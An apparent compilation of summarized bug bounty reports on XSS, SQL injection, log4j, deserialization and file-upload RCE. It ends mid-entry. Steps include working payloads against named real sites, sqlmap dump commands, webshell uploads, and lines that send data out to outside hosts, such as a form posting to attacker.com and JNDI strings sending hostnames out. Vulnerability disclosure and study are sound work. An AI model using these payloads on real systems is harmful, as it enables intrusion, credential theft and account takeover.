The vulnerability involves a CSS injection on the /embed/ endpoint via the bgcolor parameter, which can be exploited to leak a user's CSRF token. This token can then be used to perform CSRF attacks or potentially combined with other endpoints to achieve XSS.

Steps to Reproduce:
1. Navigate to the vulnerable URL with the CSS injection parameter: https://chaturbate.com/embed/admin/?bgcolor=%7D*%7Bbackground:red&tour=nvfS&disable_sound=0&campaign=iNSGX
2. Visit the attacker's demo page to extract the CSRF token: http://d0nut.pythonanywhere.com/demo/token_stealing/7GTt5qD1LD273WYkJyaR/reset
3. Return to the demo page to observe the stolen token: http://d0nut.pythonanywhere.com/demo/token_stealing/7GTt5qD1LD273WYkJyaR

--------------------------------------------------------------------------------

Report 52: XSS in steam react chat client
================================================================================
Vulnerability Description:
The vulnerability is an XSS in the Steam chat client that leverages BBCode's [url] tag to execute javascript: URIs, bypassing React's XSS mitigations. This could potentially lead to remote code execution due to the client's use of Electron or a similar webview system that exposes system functions.

Steps to Reproduce:
1. Identify that the Steam chat client uses BBCode for formatting messages, including the [url] tag which can contain arbitrary URLs.
2. Craft a malicious BBCode message with a javascript: URI in the [url] tag to exploit React's lack of mitigation for javascript: URI based XSS.
3. Send the crafted message through the Steam chat client, which transmits sanitized messages over a binary WebSocket.
4. Observe the execution of the XSS payload in the recipient's chat client, which is persistent and could lead to remote code execution.

--------------------------------------------------------------------------------

Report 53: URL Advisor component in KIS products family is vulnerable to Universal XSS
================================================================================
Vulnerability Description:
The URL Advisor component in Kaspersky Internet Security is vulnerable to Universal XSS due to improper origin validation in message handling. This allows malicious websites to inject JavaScript into the context of any domain, including sensitive ones like google.com, by exploiting the postMessage API and clickjacking.

Steps to Reproduce:
1. Download and run the provided server.py and universal_xss.html files on a local server.
2. Edit the hosts file to add a line redirecting www.google.example.com to localhost.
3. Open Microsoft Edge and navigate to http://www.google.example.com:5000/universal_xss.html.
4. Follow the on-screen instructions to move the mouse and click, triggering the XSS payload.

--------------------------------------------------------------------------------

Report 54: Html Injection and Possible XSS via MathML
================================================================================
Vulnerability Description:
The vulnerability allows HTML injection and possible XSS via MathML in Firefox. By injecting a MathML element with a JavaScript href attribute, an attacker can execute arbitrary JavaScript when the link is clicked. This can lead to session hijacking or other malicious actions.

Steps to Reproduce:
1. Login to your mopub account.
2. Go to account settings.
3. Click on Edit user settings.
4. Add the payload in the Title field: <math href="javascript:alert(1)">CLICKME</math>
5. Click on Submit Button.
6. HTML link will be stored in account Title.
7. Click on that html link and XSS will be executed in Firefox.

--------------------------------------------------------------------------------

Report 55: Multiple XSS on account settings that can hijack any users in the company. 
================================================================================
Vulnerability Description:
This is a stored Cross-Site Scripting (XSS) vulnerability in MoPub's account settings, allowing attackers to inject malicious scripts that execute in the context of other users (including administrators). The attack is bidirectional (vice versa), meaning both members and admins can exploit it to hijack sessions.

Steps to Reproduce:
1. Login to MoPub: https://app.mopub.com/account/login/
2. Go to account settings and inject a malicious script in any input field (e.g., currency or company name)
3. When a victim visits the reports tab, account settings, or edit user settings, the XSS payload will trigger

--------------------------------------------------------------------------------

Report 56: Potential unprivileged Stored XSS through wp_targeted_link_rel
================================================================================
Vulnerability Description:
The vulnerability is a Stored XSS via attribute injection in the `wp_targeted_link_rel()` function in WordPress. This function improperly handles the `rel` attribute in anchor tags, allowing an attacker to inject malicious attributes that can execute arbitrary JavaScript when processed. The issue arises because the function does not properly account for the position of the `rel` attribute within other quoted attributes, leading to attribute escaping and injection.

Steps to Reproduce:
1. Log in as an administrator and enable the display of user bio in BuddyPress settings (Appearance -> Customize -> BuddyPress Nouveau -> Member front page).
2. Create a normal forum user account, log in, and edit the profile to insert the XSS payload: `<a href="#" title=" target='abc' rel= onmouseover=alert(/XSS/) ">This is a PoC for a Stored XSS</a>` as the user description.
3. Visit the user profile page and hover over the link to trigger the XSS.

--------------------------------------------------------------------------------

Report 57: Stored XSS in Wiki pages
================================================================================
Vulnerability Description:
Stored XSS vulnerability in GitLab Wiki pages where hierarchical link Markdown processing improperly converts certain strings into dangerous javascript: links without proper sanitization, allowing execution of arbitrary JavaScript when clicked.

Steps to Reproduce:
1. Sign in to GitLab and open a Project page with Wiki edit permissions
2. Create a new Wiki page with a slug containing 'javascript:' and save it
3. Click the created link to trigger the XSS payload

--------------------------------------------------------------------------------

Report 58: WooCommerce: Persistent XSS via customer address (state/county)
================================================================================
Vulnerability Description:
The WooCommerce plugin (version 3.5.7) fails to properly sanitize the state/county field in customer addresses, allowing persistent XSS. An attacker with a customer account can inject malicious scripts that execute when an admin views the customer's profile in the backend.

Steps to Reproduce:
1. Install WooCommerce plugin (version 3.5.7) and enable user registration.
2. Register as a customer and log in to the account.
3. Navigate to checkout or edit address page and enter a malicious payload in the County/State field (e.g., '"><img src=x onerror=alert(1) x=y').
4. As an admin, visit the user profile page in the WordPress admin panel to trigger the XSS payload.

--------------------------------------------------------------------------------

Report 59: Cross-site scripting on algorithm collaborator 
================================================================================
Vulnerability Description:
A cross-site scripting (XSS) vulnerability exists in the algorithm collaborator's web interface, where specially crafted websocket messages can execute arbitrary JavaScript in the collaborator's browser. The vulnerability arises because HTML entities in websocket messages are not properly encoded server-side, allowing an attacker to inject malicious scripts that execute in the context of the collaborator's session.

Steps to Reproduce:
1. Intercept the websocket request that sends messages between collaborators in the algorithm debugger.
2. Replace the message content with a raw HTML/JavaScript payload (e.g., <img src=x onerror=alert(1)>).

--------------------------------------------------------------------------------

Report 60: Stored XSS in merge request pages
================================================================================
Vulnerability Description:
Stored XSS vulnerability in merge request pages where a specially crafted branch name containing an XSS payload is rendered unsanitized when certain merge conditions are met and viewed by a user without push permissions.

Steps to Reproduce:
1. Run Gitlab docker container
2. Create a new project and perform initial commits
3. Create a branch with a malicious name containing XSS payload
4. Create a merge request from master to the malicious branch
5. Visit the merge request page as a user without push permissions

--------------------------------------------------------------------------------

Report 61: Stored XSS on upload files leads to steal cookie
================================================================================
Vulnerability Description:
A stored XSS vulnerability exists in the file upload functionality, where an attacker can upload a malicious SVG file disguised as another format (e.g., .png, .gif, .bmp). When the victim interacts with the file, the XSS payload executes, allowing the attacker to steal the victim's cookies and potentially take over their account.

Steps to Reproduce:
1. Create two accounts: one for the attacker (e.g., seq@seq.teamoutpost.com) and one for the victim (e.g., seq1@seq1.teamoutpost.com).
2. Log in as the attacker and create a new conversation in the Inbox. Attach a malicious SVG file renamed to a different format (e.g., .png, .gif, .bmp) containing an XSS payload (e.g., `<svg ... onload="alert(document.cookie)">`).
3. Send the malicious file to the victim. When the victim clicks on the file, the XSS payload executes, stealing their cookie.

--------------------------------------------------------------------------------

Report 62: Хранимый XSS в Business-аккаунте, на странице компании
================================================================================
Vulnerability Description:
The application is vulnerable to stored XSS attacks via the 'Company Name' field in the Business account settings. The input is not properly sanitized, allowing execution of arbitrary JavaScript when the company page is viewed.

Steps to Reproduce:
1. Register an account on drive2.ru and upgrade to a Business account
2. Navigate to the company management panel and enter a malicious payload (e.g., '<svg/onload=confirm(document.domain)>') in the 'Company Name' field

--------------------------------------------------------------------------------

Report 63: Stored XSS in markdown when redacting references
================================================================================
Vulnerability Description:
A stored XSS vulnerability exists in the markdown rendering when redacting references. The vulnerability allows injecting arbitrary HTML via the data-original attribute, which is not properly sanitized when the reference is redacted. This can be exploited to execute JavaScript in the context of the victim's session.

Steps to Reproduce:
1. Create a private project with one account and create an issue in it.
2. Sign into another account that does not have permission to read the private project and post a link to the issue with malicious HTML in the data-original attribute.

--------------------------------------------------------------------------------

Report 64: Stored XSS in Elastic App Search
================================================================================
Vulnerability Description:
A stored XSS vulnerability exists in Elastic App Search v7.6.2 via the 'url' parameter in the reference_ui. A low-privileged user can inject malicious JavaScript that gets executed when a high-privileged user views the generated link.

Steps to Reproduce:
1. Go to https://cloud.elastic.co/ and login
2. Create a deployment with App Search selected under 'Optimize your deployment'
3. Launch the App Search instance and log in with provided credentials
4. Click 'Create an Engine' and select 'Paste JSON'
5. Insert the malicious JSON payload: {"url":"javascript://test%0aalert(document.domain)"}
6. Share the generated Reference UI link with a high-privileged user

--------------------------------------------------------------------------------

Report 65: Stored XSS via 64(?) vulnerable fields in ███ leads to credential theft/account takeover
================================================================================
Vulnerability Description:
Stored XSS across 64 form fields allows attackers to inject persistent malicious scripts, leading to credential theft, session hijacking, or other client-side attacks when viewed by authorized users.

Steps to Reproduce:
1. Browse to the vulnerable form at https://██████████
2. Fill in 64 different fields with XSS payloads (e.g., <script>alert(1)</script> or credential-stealing forms)
3. Submit the form and observe the payloads execute when viewed by legal personnel
4. For credential theft, use a payload like: <h3>Please login</h3><form action=http://attacker.com>...

--------------------------------------------------------------------------------

Report 66: Stored XSS in TSVB Visualizations Markdown Panel
================================================================================
Vulnerability Description:
An authenticated user can save a TSVB visualization containing a stored XSS payload in the included Less code as part of the markdown panel. When another authenticated user edits the Less code, the payload fires, allowing JavaScript execution.

Steps to Reproduce:
1. Login to Kibana and navigate to the visualizations page and click 'Create Visualization'
2. Select TSVB
3. Navigate to the Markdown tab
4. Navigate to the Panel options sub tab
5. Place the payload in the custom CSS editor: body { color: `confirm('XSS')`; }
6. Save the visualization
7. As another user, navigate to the visualizations custom css and edit the Less
8. Notice the Confirm dialog

--------------------------------------------------------------------------------

Report 67: Stored XSS on https://apps.topcoder.com/wiki/plugins/socialbookmarking/updatebookmark.action
================================================================================
Vulnerability Description:
A stored Cross-Site Scripting (XSS) vulnerability exists in the social bookmarking feature of the Topcoder wiki. By injecting a JavaScript URL when creating a bookmark, an attacker can execute arbitrary JavaScript code in the context of the victim's browser when the bookmark is clicked.

Steps to Reproduce:
1. Go to https://apps.topcoder.com/wiki/plugins/socialbookmarking/updatebookmark.action
2. Enter 'javascript:alert(document.domain)' in the URL input field and fill in other required fields
3. Create the bookmark and navigate to https://apps.topcoder.com/wiki/display/tcwiki/<TITLE>
4. Click on the bookmark title to trigger the XSS payload

--------------------------------------------------------------------------------

Report 68: Stored XSS on https://apps.topcoder.com/wiki/pages/editpage.action
================================================================================
Vulnerability Description:
A stored XSS vulnerability exists in the vote macro functionality of the Topcoder wiki. When a malicious vote macro containing an XSS payload is saved to a wiki page, the payload executes when another user edits the page. This allows attackers to execute arbitrary JavaScript in the context of the victim's session.

Steps to Reproduce:
1. Navigate to a wiki page on https://apps.topcoder.com/wiki/pages/editpage.action?pageId=
2. Insert the following vote macro with XSS payload:
{vote:What is your favorite vulnerability?}
RCE
SSRF
XSS"><img src=X onerror=alert(document.domain)>
{vote}
3. Save the page. The XSS will execute when another user edits this page.

--------------------------------------------------------------------------------

Report 69: Blind stored XSS due to insecure contact form at https://www.topcoder.com leads to leakage of session token and other PII
================================================================================
Vulnerability Description:
A blind stored XSS vulnerability exists in the contact form at https://www.topcoder.com/contact-us/ due to insufficient input sanitization. An attacker can submit a malicious script payload that executes in the admin panel, leading to session token leakage and potential admin account compromise.

Steps to Reproduce:
1. Navigate to the contact form at https://www.topcoder.com/contact-us/
2. Submit a blind XSS payload in the First Name, Last Name, Company, and Description fields (e.g., "><script src=https://xvt.xss.ht></script>)
3. Wait for an admin to access the submitted form data, triggering the XSS payload in the admin panel
4. Receive the XSS hunter notification containing admin session tokens and other sensitive information

--------------------------------------------------------------------------------

Report 70: Android WebViews in Twitter app are vulnerable to UXSS due to configuration and CVE-2020-6506
================================================================================
Vulnerability Description:
Twitter for Android is affected by a UXSS vulnerability due to its configuration of Android WebView and CVE-2020-6506. An Android WebView instance with WebSettings.setSupportMultipleWindows() kept at default or set to false allows an iframe on a different origin bypass same-origin policies and execute arbitrary JavaScript in the top document.

Steps to Reproduce:
1. Using the PoC 1 Card, navigate to https://alesandroortiz.com/security/chromiumwebview/cve-2020-6506.html
2. Tap/click iframe.

--------------------------------------------------------------------------------

Report 71: Stored XSS via Comment Form at ████████
================================================================================
Vulnerability Description:
A stored Cross-Site Scripting (XSS) vulnerability exists in the comment form of the target website, allowing attackers to inject malicious scripts that execute in the context of other users' browsers when the comments are viewed. This can lead to credential theft, forced browsing, or other malicious actions.

Steps to Reproduce:
1. Browse to the target website and locate the comment form.
2. Inject malicious HTML/JavaScript payloads into the Name and Comments fields (e.g., `<script src=http://attackerip/blind.js/>` or `<form action=http://attackerIP>`).
3. Submit the form and observe the execution of the payload when the comment is viewed by an employee or another user.

--------------------------------------------------------------------------------

Report 72: Subdomain takeover due to an unclaimed Amazon S3 bucket on ███
================================================================================
Vulnerability Description:
An unclaimed Amazon S3 bucket associated with a subdomain allows an attacker to take over the subdomain by creating the bucket and hosting malicious content, leading to potential attacks like XSS, phishing, and data theft.

Steps to Reproduce:
1. Check DNS records for the subdomain using a tool like dig to identify if it points to an Amazon S3 bucket.
2. If the S3 bucket does not exist, create a bucket with the same name in the same region and upload malicious content.

--------------------------------------------------------------------------------

Report 73: Stored XSS in my staff name fired in another your internal panel
================================================================================
Vulnerability Description:
A stored cross-site scripting (XSS) vulnerability was discovered where a payload injected into the staff name field in a test store executed in an internal Shopify panel. This indicates that the staff name data was shared or accessible across different systems without proper sanitization.

Steps to Reproduce:
1. Create a test store 'trstore-3.myshopify.com' on Shopify
2. Inject a stored XSS payload into the staff name field in the test store

--------------------------------------------------------------------------------

Report 74: Store-XSS in error message of build-dependencies 
================================================================================
Vulnerability Description:
A stored-XSS vulnerability exists in the error message of build-dependencies in GitLab's self-managed installations. The vulnerability allows an attacker to inject malicious JavaScript via a crafted job name in the .gitlab-ci.yml file, which is then executed when viewing the job details.

Steps to Reproduce:
1. Create an empty project in a self-managed GitLab installation
2. Go to 'Settings/CI/CD/Runners' to setup a runner for this project
3. Create a new file .gitlab-ci.yml with the provided malicious content
4. Wait for the jobs to terminate and go to the detail of job-test
5. Observe the alert containing the current URL, indicating the XSS execution

--------------------------------------------------------------------------------



Weaknesses.OTHER_INJECTION Vulnerabilities (109 reports)
--------------------------------------------------

Report 1: SQL Injection in www.██████████
================================================================================
Vulnerability Description:
SQL Injection vulnerability in the 'rnum' parameter of the POST request, allowing attackers to manipulate database queries and potentially access sensitive data.

Steps to Reproduce:
1. Intercept the HTTP POST request to the vulnerable endpoint using a proxy like Burp Suite.
2. Modify the 'rnum' parameter in the POST request to inject SQL code that alters the database query, such as changing the OFFSET clause.

--------------------------------------------------------------------------------

Report 2: [████] SQL Injections on Referer Header exploitable via Time-Based method
================================================================================
Vulnerability Description:
The vulnerability is a time-based SQL injection in the Referer header of several endpoints. Attackers can manipulate the Referer header to execute arbitrary SQL commands, allowing them to extract database information by observing response delays.

Steps to Reproduce:
1. Identify vulnerable endpoints by checking the Referer header in HTTP requests to URLs like https://████████/█████/Chart01.php?alert=
2. Use time-based SQL injection via the Referer header with a payload like: '+(select*from(select(if(1=1,sleep(20),false)))a)+'
3. Observe the response time; a delay indicates a successful injection (e.g., 21 seconds for true condition, 2 seconds for false)
4. Extract database information by modifying the payload to test conditions like substring(database(),1,1)='m'

--------------------------------------------------------------------------------

Report 3: Blind SQL injection at tsftp.informatica.com
================================================================================
Vulnerability Description:
The refresh_token parameter in the /api/v1/token endpoint is vulnerable to blind SQL injection, allowing attackers to execute arbitrary SQL commands and potentially exfiltrate data, bypass authentication, or achieve remote code execution.

Steps to Reproduce:
1. Send a POST request to https://tsftp.informatica.com/api/v1/token with a malicious refresh_token parameter containing a SQL injection payload (e.g., '; WAITFOR DELAY '0:0:1'--)
2. Observe the response time delay corresponding to the injected WAITFOR DELAY command, confirming SQL injection

--------------------------------------------------------------------------------

Report 4: Sql injection on docs.atavist.com
================================================================================
Vulnerability Description:
The vulnerability is a time-based SQL injection in the 'search' parameter of the stories.php endpoint. This allows an attacker to execute arbitrary SQL queries on the backend MySQL database, potentially leading to data leakage or other malicious actions.

Steps to Reproduce:
1. Navigate to http://docs.atavist.com/reader_api/stories.php?limit=10&offset=20&organization_id=88822&search=0&sort=
2. Modify the 'search' parameter to include a SQL injection payload, e.g., search=0' AND SLEEP(5) AND 'wRIg' LIKE 'wRIg

--------------------------------------------------------------------------------

Report 5: [intensedebate.com] SQL Injection Time Based On /js/commentAction/
================================================================================
Vulnerability Description:
A time-based SQL injection vulnerability exists in the `acctid` parameter of the `/js/commentAction/` endpoint, allowing an attacker to execute arbitrary SQL queries by manipulating the parameter to include time-delay payloads (e.g., `SLEEP(15)`). Additionally, the `src` parameter is vulnerable to self-XSS.

Steps to Reproduce:
1. Send a GET request to `/js/commentAction/` with a JSON payload containing the vulnerable `acctid` parameter modified to include a SQL time-based payload (e.g., `251219%20AND%20SLEEP(15)%23`).
2. Observe the response time to confirm the SQL injection (e.g., delayed response matching the SLEEP duration).

--------------------------------------------------------------------------------

Report 6: [marketplace.informatica.com] - XXE
================================================================================
Vulnerability Description:
This is an XML External Entity (XXE) vulnerability in the Informatica Marketplace. The application processes XML input from user-controlled sources without proper validation or disabling of external entity references, allowing attackers to read arbitrary files on the server.

Steps to Reproduce:
1. Send a POST request to `/__services/v2/rest/wall/new/count` on `marketplace.informatica.com` with a crafted XML payload containing an XXE entity.
2. Observe the server's response, which may include sensitive file contents (e.g., `/etc/passwd`) if the XXE attack is successful.

--------------------------------------------------------------------------------

Report 7: [hta3] Remote Code Execution on ████
================================================================================
Vulnerability Description:
The vulnerability allows remote code execution via manipulation of the 'rdExportFilename' and 'rdReportName' parameters in a POST request. By crafting a malicious request, an attacker can upload a webshell to the server and execute arbitrary commands.

Steps to Reproduce:
1. Visit the target URL and login with provided credentials.
2. Navigate to the 'Reports' section, select any report, and click 'Run Report'.
3. Intercept the request using Burp Suite when clicking 'Export to Excel'.
4. Modify the 'rdExportFilename' parameter to a desired filename with .aspx extension.
5. Change the 'rdReportName' parameter in the POST body to include a URL-encoded ASPX webshell.
6. Forward the request and access the uploaded webshell to execute commands.

--------------------------------------------------------------------------------

Report 8: Server Side Template Injection on Name parameter during Sign Up process
================================================================================
Vulnerability Description:
Server-side template injection vulnerability in the First Name field during the sign-up process, allowing execution of malicious payloads in promotional/welcome emails.

Steps to Reproduce:
1. Navigate to the Glovo registration page and click on Register.
2. Enter the payload {{7*7}} in the First Name field and complete the registration process.
3. Wait for the welcome/promotional email to arrive and observe the evaluated payload in the email subject.
4. Confirm the vulnerability by testing with other malicious payloads to gather sensitive information.

--------------------------------------------------------------------------------

Report 9: Insecure Bundler configuration fetching internal Gems (okra) from Rubygems.org
================================================================================
Vulnerability Description:
The vulnerability arises from a misconfigured Bundler setup that fetches internal gems from Rubygems.org when a higher version is available, potentially allowing arbitrary code execution if a malicious gem is installed.

Steps to Reproduce:
1. Identify an internal gem (e.g., 'okra') that is also published on Rubygems.org.
2. Publish a higher version of the gem on Rubygems.org to exploit misconfigured Bundler settings.

--------------------------------------------------------------------------------

Report 10: XML Injection / External Service Interaction (HTTP/DNS) On https://█████████.mil
================================================================================
Vulnerability Description:
The vulnerability involves XML Injection and External Service Interaction (HTTP/DNS) on a .mil domain. By injecting malicious XML or HTTP payloads, an attacker can force the server to interact with external services, potentially leading to data exfiltration, SSRF, or amplification attacks.

Steps to Reproduce:
1. Send a crafted XML payload to the vulnerable endpoint: https://█████.mil/██████████ with an external DNS/HTTP reference to a Burp Collaborator instance.
2. Alternatively, send a simple HTTP request to the vulnerable endpoint with a Burp Collaborator URL as a parameter.

--------------------------------------------------------------------------------

Report 11:  Pre-auth RCE in ForgeRock OpenAM (CVE-2021-35464)
================================================================================
Vulnerability Description:
This vulnerability allows unauthenticated remote code execution (RCE) in ForgeRock OpenAM via unsafe Java deserialization in the Jato framework. An attacker can craft a malicious serialized object that gets deserialized by the server, leading to arbitrary code execution.

Steps to Reproduce:
1. Download the ysoserial payload generator jar file: `wget https://github.com/Bin4xin/sweet-ysoserial/blob/master/target/ysoserial-0.0.6-SNAPSHOT-all.jar`
2. Generate the payload with a command to trigger a request to a Burp Collaborator instance: `java -jar ysoserial-master-SNAPSHOT.jar Click1 "curl https://g0h7qcjzwzpzdh2ar6b5f9x3puvkj9.burpcollaborator.net" | (echo -ne \\x00 && cat) | base64 | tr '/+' '_-' | tr -d '=' | tr -d '\n' > payload.txt`
3. Send the payload in a GET request to the vulnerable OpenAM endpoint: `GET /██████████=XYZ HTTP/1.1` (replace XYZ with the contents of payload.txt)

--------------------------------------------------------------------------------

Report 12: Pre-auth RCE in ForgeRock OpenAM (CVE-2021-35464)
================================================================================
Vulnerability Description:
This vulnerability is a pre-authentication Remote Code Execution (RCE) in ForgeRock OpenAM, caused by unsafe Java deserialization in the Jato framework. An attacker can exploit this by sending a specially crafted request that triggers the deserialization of malicious payloads, leading to arbitrary code execution on the server.

Steps to Reproduce:
1. Download the ysoserial jar file and generate a payload using a command that includes a malicious URL.
2. Send a crafted GET request to the target OpenAM server with the generated payload in the 'jato.pageSession' parameter.

--------------------------------------------------------------------------------

Report 13: SQL injection located in `███` in POST param `████████` 
================================================================================
Vulnerability Description:
An SQL injection vulnerability was found in a POST parameter of a web application, allowing an attacker to execute arbitrary SQL queries and potentially gain full control over the MySQL database.

Steps to Reproduce:
1. Intercept the request to the vulnerable endpoint using Burp Suite.
2. Modify the POST parameter with the SQL injection payload: `2021 AND (SELECT 6868 FROM (SELECT(SLEEP(32)))IiOE)`.
3. Use sqlmap to automate the exploitation: `sqlmap -f --risk 2 -r /home/kali/Desktop/sql --dbms=mysql --tables --dump -p [parameter_name]`.

--------------------------------------------------------------------------------

Report 14: blind sql on  [ https://argocd.upchieve.org/login?return_url=id= ]
================================================================================
Vulnerability Description:
A blind SQL injection vulnerability exists in the login page of the application. The vulnerability allows an attacker to execute arbitrary SQL commands by injecting malicious payloads into the 'id' parameter, which can lead to unauthorized data access or manipulation.

Steps to Reproduce:
1. Navigate to the login page: https://argocd.upchieve.org/login?return_url=id=
2. Inject the SQL payload: id=291751-sleep(5)&hash=f42ffae0449536cfd0419826f3adf136

--------------------------------------------------------------------------------

Report 15: RCE on 17 different Docker containers on your network
================================================================================
Vulnerability Description:
The vulnerability involves gaining Remote Code Execution (RCE) on 17 different Docker containers due to an unconfigured Portainer service with default credentials. This allows an attacker to interact with and execute arbitrary commands on the containers, potentially leading to full system compromise.

Steps to Reproduce:
1. Discover an unconfigured Portainer service running on http://spreed-demo.nextcloud.com:9000
2. Create an administrator account with default credentials (admin:password) and gain access to the Portainer backend

--------------------------------------------------------------------------------

Report 16: CVE-2021-40870 in [███]
================================================================================
Vulnerability Description:
An unrestricted file upload vulnerability in Aviatrix Controller allows unauthenticated attackers to upload malicious PHP files via directory traversal, leading to remote code execution.

Steps to Reproduce:
1. Send a POST request to the vulnerable endpoint with a crafted payload that includes directory traversal and a PHP file upload: POST /v1/backend1 HTTP/1.1 with CID=x&action=set_metric_gw_selections&account_name=/../../../var/www/php/1yv4QQmkj4h4OdmmyT11tkiGf5M.php&data=RCE<?php phpinfo()?>
2. Retrieve the uploaded PHP file to confirm remote code execution: GET /v1/1yv4QQmkj4h4OdmmyT11tkiGf5M.php HTTP/1.1

--------------------------------------------------------------------------------

Report 17: Ingress-nginx annotation injection allows retrieval of ingress-nginx serviceaccount token and secrets across all namespaces
================================================================================
Vulnerability Description:
The vulnerability allows an attacker with permissions to create/modify Ingress resources to inject malicious nginx directives via unescaped template variables in annotations. This leads to arbitrary file read on the ingress controller, including the service account token which has cluster-wide secrets access.

Steps to Reproduce:
1. Identify an ingress-nginx controller version vulnerable to annotation injection (e.g., v1.0.4).
2. Create or modify an Ingress resource with a malicious annotation (e.g., nginx.ingress.kubernetes.io/connection-proxy-header) containing injected nginx directives.
3. Use the injected directives to read arbitrary files from the ingress controller's filesystem, including the service account token.
4. Use the stolen service account token to access secrets across all namespaces.

--------------------------------------------------------------------------------

Report 18: [forum.acronis.com] JNDI Code Injection due an outdated log4j component
================================================================================
Vulnerability Description:
The vulnerability is a JNDI code injection due to an outdated log4j component (CVE-2021-44228), allowing authenticated users to perform remote code execution via JNDI exfiltration. The attack exploits the log4j library's handling of crafted input strings, leading to command execution on the server.

Steps to Reproduce:
1. Identify the vulnerable endpoint: https://forum.acronis.com/search?s=${j${main:\k5:-Nd}i${spring:k5:-:}ldap://${sys:user.name}-04363f1f3427b48.test3.ggdd.co.uk/}
2. Trigger the JNDI injection by sending a crafted request to the endpoint, which exfiltrates system information to a controlled server (ggdd.co.uk)

--------------------------------------------------------------------------------

Report 19: SQL injection in https://demor.adr.acronis.com/ via the username parameter
================================================================================
Vulnerability Description:
The vulnerability is a SQL injection in the login endpoint of the application, where the 'username' parameter is not properly sanitized. This allows an attacker to execute arbitrary SQL commands, leading to potential authentication bypass, data leakage, or even remote code execution.

Steps to Reproduce:
1. Intercept the login request to https://demor.adr.acronis.com/ng/api/auth/login using a tool like Burp Suite.
2. Modify the 'username' parameter in the POST request to include a SQL injection payload such as: {"username":"0'XOR(if(now()=sysdate(),sleep(35),0))XOR'Z","id":"27","password":"cc4226104294e44c5cec9f31cb6de7fa4597e4321b277f4e4b78c3a0ff980956"}

--------------------------------------------------------------------------------

Report 20: ███ ████████ running a vulnerable log4j
================================================================================
Vulnerability Description:
The vulnerability involves exploiting a known issue in log4j (CVE-2021-44228) where a malicious JNDI string can trigger arbitrary code execution via LDAP requests. This is a widespread and well-documented vulnerability affecting many systems using log4j for logging.

Steps to Reproduce:
1. Browse to the target URL and enter a malicious JNDI string (e.g., ${jndi:ldap://dns-server-yoi-control/a}) into the username field.
2. Submit the form and observe if a request is made to the specified DNS server, indicating a vulnerable log4j instance.

--------------------------------------------------------------------------------

Report 21: Log4j Java RCE in [beta.dev.adobeconnect.com]
================================================================================
Vulnerability Description:
The vulnerability is a Remote Code Execution (RCE) in Log4j versions prior to 2.15.0, where an attacker can exploit the JNDI lookup feature to execute arbitrary code via LDAP. The server logs the malicious input, triggering the vulnerability.

Steps to Reproduce:
1. Send a crafted HTTP GET request to the target URL with a JNDI lookup string in the query parameter: GET /?x=${jndi:ldap://${hostName}.dq7iqbvjiufrlpt5mri9dvpb42atyi.burpcollaborator.net/a} HTTP/1.1
2. Observe the response or check the Burp Collaborator for any incoming LDAP requests, indicating the server is vulnerable to Log4j RCE

--------------------------------------------------------------------------------

Report 22: [careers.informatica.com] Reflected Cross Site Scripting to XSS Shell Possible
================================================================================
Vulnerability Description:
The careers page of informatica.com is vulnerable to reflected cross-site scripting (XSS) via the 'isJTN' parameter in the URL. An attacker can craft a malicious link containing JavaScript code, which executes when the victim clicks the link. This can be weaponized to steal cookies, redirect the browser, or deliver malware.

Steps to Reproduce:
1. Identify the vulnerable parameter 'isJTN' in the URL: https://careers.informatica.com/apply?isJTN=PAYLOAD
2. Replace PAYLOAD with a malicious script, e.g., <script>prompt('ZephrFish')</script>, and send the crafted URL to a victim.

--------------------------------------------------------------------------------

Report 23: SQL Injection in █████
================================================================================
Vulnerability Description:
This is a SQL injection vulnerability that allows an attacker to exfiltrate the entire database and potentially gain remote code execution (RCE). The vulnerability is present in the parameter "█████" of the ████████ endpoint, which is not properly sanitized.

Steps to Reproduce:
1. Use curl to inject a SQL query that returns the database version: curl https://█████████ -X POST -data="url=%2F████████&███████=AA'+OR(cast(version as date))LIKE'A" -k
2. Use curl to inject a SQL query that returns the current database user: curl https://███████████████ -X POST -data="url=%2F██████████&███=AA'+OR(cast(current_user as date))LIKE'A" -k
3. Use curl to inject a SQL query that returns the current user: curl https://█████████ -X POST -data="url=%2F████&█████=AA'+OR(cast(current_user as date))LIKE'A" -k

--------------------------------------------------------------------------------

Report 24: RCE via the DecompressedArchiveSizeValidator and Project BulkImports (behind feature flag)
================================================================================
Vulnerability Description:
The vulnerability allows remote code execution through improper shell command construction in the DecompressedArchiveSizeValidator when processing project imports via the Bulk Import feature. The validator passes untrusted input directly to a shell command via Open3.popen3, enabling command injection when the bulk_import_projects feature is enabled.

Steps to Reproduce:
1. Enable the bulk_import_projects feature flag in GitLab's Rails console
2. Use the Bulk Import feature to import a project with a malicious import_source parameter containing shell commands
3. Wait for the import process to reach the decompressed archive validation step
4. Observe command execution when the vulnerable validator processes the malicious input

--------------------------------------------------------------------------------

Report 25: LOGJ4 VUlnerability [HtUS]
================================================================================
Vulnerability Description:
This vulnerability involves the Log4j library (CVE-2021-44228), which allows Remote Code Execution (RCE) via a crafted JNDI lookup in the log message. The attacker can exploit this by sending a specially crafted request to a vulnerable application, which then executes arbitrary code.

Steps to Reproduce:
1. Go to the vulnerable URL: https://█████/?x=${jndi:ldap://${hostName}.uri.xxxxx.burpcollaborator.net/a}
2. Paste the POC code into the parameter and observe the reverse ping back in Burp Collaborator

--------------------------------------------------------------------------------

Report 26: SQL Injection at https://████████.asp (█████████) [selMajcom] [HtUS]
================================================================================
Vulnerability Description:
SQL injection vulnerability in https://█████████.asp allows unauthenticated attackers to execute arbitrary SQL queries, potentially leading to data exfiltration, tampering, or remote code execution.

Steps to Reproduce:
1. Access https://█████████.asp and create a user account.
2. Capture the request in Burp Suite after creating the user and modify the 'selMajcom' parameter to inject a SQL query.
3. Save the modified request to a file (e.g., dod.txt) and use sqlmap to automate the attack: 'python sqlmap.py -r dod.txt --dbs --level 3 risk 3 -v3'.

--------------------------------------------------------------------------------

Report 27: ██████_log4j - https://██████
================================================================================
Vulnerability Description:
The vulnerability is a Log4j Remote Code Execution (RCE) vulnerability, where logging untrusted or user-controlled data with a vulnerable version of Log4J can lead to RCE. This includes data from logged errors, authentication failures, and other unexpected vectors of user-controlled input.

Steps to Reproduce:
1. Send a POST request to the endpoint: https://██████/mifs/j_spring_security_check
2. Use the following payload in the request: j_username=${jndi:ldap://${hostName}.youinteractsserver}&j_password=password&logincontext=employee

--------------------------------------------------------------------------------

Report 28: Synthetics Recorder: Code injection when recording website with malicious content
================================================================================
Vulnerability Description:
The vulnerability allows for code injection in the Synthetics Recorder when recording a website with malicious content. Specifically, the waitForNavigation event's quote function fails to properly escape user-controlled input within a multi-line comment context, enabling an attacker to inject arbitrary code that executes when the recorded session is run.

Steps to Reproduce:
